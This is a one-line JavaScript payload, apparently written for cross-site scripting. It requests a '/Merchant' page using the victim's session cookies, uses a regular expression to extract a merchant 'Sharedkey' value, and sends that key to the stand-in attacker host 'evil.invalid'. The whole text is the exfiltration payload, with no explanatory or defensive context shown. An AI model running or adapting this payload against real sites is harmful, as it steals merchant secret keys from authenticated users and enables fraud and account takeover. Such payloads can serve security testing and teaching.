fetch("/Merchant",{credentials: 'include'}).then(response=>response.text()).then(data=>{ fetch('https://evil.invalid/?leaked-sharedkey='+data.match(/<b>Sharedkey<\/b><\/td><td>(.)+?<\/td>/g)[0].slice(26,-5));});
